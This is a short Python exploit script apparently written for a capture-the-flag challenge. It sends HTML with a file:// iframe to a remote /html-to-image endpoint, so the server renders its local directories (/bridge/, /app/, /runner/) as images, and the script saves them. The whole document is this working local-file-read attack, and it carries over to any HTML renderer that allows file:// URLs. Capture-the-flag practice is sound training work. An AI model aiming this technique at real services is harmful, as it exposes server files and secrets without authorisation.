import requests, io, zipfile, time

BASE = 'http://fad4fa65501e0c52f811e82ff7b1afca.playat.flagyard.com'

def ls(path, name):
    s = requests.Session()
    s.headers.update({'User-Agent': 'Mozilla/5.0'})
    html = f'<iframe src="file://{path}" style="width:1250px;height:2600px;border:0"></iframe>'
    for _ in range(2):
        try:
            r = s.post(BASE + '/html-to-image', json={'pages': [html]}, timeout=45)
            if r.status_code == 200 and 'zip' in r.headers.get('Content-Type',''):
                z = zipfile.ZipFile(io.BytesIO(r.content))
                for n in z.namelist():
                    with open(f'f:/mission-git-hackss/mission-git-hackss/ls_{name}.jpg','wb') as f: f.write(z.read(n))
                    print(f'{name} ({path}): {len(z.read(n))} bytes')
                return
            print(f'{name}: [{r.status_code}] {r.text[:120]}')
            return
        except Exception: time.sleep(2)

ls('/bridge/', 'bridge')
time.sleep(1)
ls('/app/', 'appdir')
time.sleep(1)
ls('/runner/', 'runnerdir')
